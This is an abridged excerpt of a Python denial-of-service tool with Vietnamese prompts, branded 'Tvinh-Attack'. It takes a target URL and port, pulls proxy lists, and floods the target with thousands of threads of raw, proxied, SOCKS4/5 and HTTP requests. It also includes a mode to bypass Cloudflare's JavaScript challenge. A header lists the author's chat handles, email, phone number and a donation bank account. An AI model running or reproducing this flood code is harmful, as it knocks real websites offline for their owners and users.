...
#[+]==============[ Contact ]===========[+]#
# # Discord: Lại Là Vinhhh #5369         # #
# # ICQ    : @Uchiha ThànhVinh           # #
# # Tele   : https://t.me/The Death      # #
# # Email  : vinhlocked205@gmail.com     # #
# # Zalo   : 0927423139                  # #
# # Donate : MB/7922620599999            # #
#[+]====================================[+]#
...
def logo():
   ...
   ⠀╦ ╦╔═╗╦ ╦╦╦ ╦╔═╗  ╦╔═╗╦ ╦╔╗╔╔═╗
    ...
    try:
        ...
        pass
    try:
        print("[*] Phương Thức Tấn Công : " +str(name_method_attack))
    except:
        pass
    try:
        print("[*] Chế độ   : " +str(filenam2))
    except:
        pass
    try:
...
def start_url():
    ...
    if sys.platform.startswith("linux"):
        ...
        if (not os.path.isfile(path)):
            print("[!] Vui lòng cài đặt NodeJs. Đang tải xuống... [!]")
    ...
    try:
        ...
        print("[!] Bạn nhập sai, hãy thử lại [!]")
        start_url()
    logo()
    try:
...
def start_port():
    ...
    if port == '':
        if "https" in url:
                port = int(443)
                print("[!] Cổng đã chọn = 443 [!]")
        else:
            port = int(80)
            print("[!] Cổng đã chọn = 80 [!]")
    else:
        port = int(port)
...
def proxies_list():
    ...
    #print ("[!] Số Proxy: %s" %(len(open(out_file).readlines())))
    logo()
    numthreads()
...
def proxyget():
    ...
    f.close() 
    proxies = open(out_file).readlines()
    #print("[!] Nhận proxy thành công ( Live 100% ) [" +out_file+ "] = [ " +str(len(open(out_file).readlines()))+ " ]")
    logo()
    numthreads()
...
""")
    ...
    if choice_mode == "0":
        ...
        print("-----------------------------")
        print("|_--> 1: Phương  Bypass v1")
        print("|_--> 2: Phương thức Bypass v2")
        filenam2 = "JS-Bypass"
        method_pass_cf = input("[?] Method [1/2]: ")
        if (method_pass_cf == "") or (method_pass_cf == "1"):
            print("[!] Phương thức đã chọn Bypass JS v1")
            method_pass_cf = "1"
        else:
            print("[!] Phương thức đã chọn Bypass JS v2")
            method_pass_cf = "2"
        logo()
        pass_cf()
    elif choice_mode == "4":
...
def pass_cf():
    ...
    try:
        ...
        print("[!] Bỏ qua đã được hoàn thành!")
        numthreads()
    except:
        error_cf += 1
        print("[!] bỏ qua một lần nữa... [" +str(error_cf)+ "]")
        if error_cf>5:
            os.system("cls")
            print("[!] ERROR BYPASS\n[!] Vui lòng chọn một phương thức tấn công khác hoặc bỏ qua[!]")
            start_mode()
        else:
            pass_cf()
...
def choice_down_proxies():
    ...
    if (choice4 == "y") or (choice4 == "Y"):
        ...
        print("[!] Đã chọn Không Nhận danh sách mới " +str(filenam2)+ " [!]")
        proxies_list()
...
def numthreads():
    ...
    try:
        ...
        threads = int(5000)
        print ("[!] Chủ đề đã chọn " +str(threads)+ " [!]\n")
    logo()
    begin()
...
def begin():
    ...
    if choice6 == "":
        ...
        if ("edu" in url) or ("vn" in url) or ("hentai" in url) or ("porn" in url):
            print("[+] Admin: NgThanhVinh Uchiha !!!")
            sleep(3)
        attack()
        print()
    else:
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+] Tvinh-Attack | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                #sys.stdout.flush()
                print("[!] Tvinh-Attack | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[!] Tvinh-Attack | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                ...
                try:
                    ...
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[!] Tvinh-Attack | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+] Tvinh-Attack | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("[!] Tvinh-Attack | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+] Tvinh-Attack | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
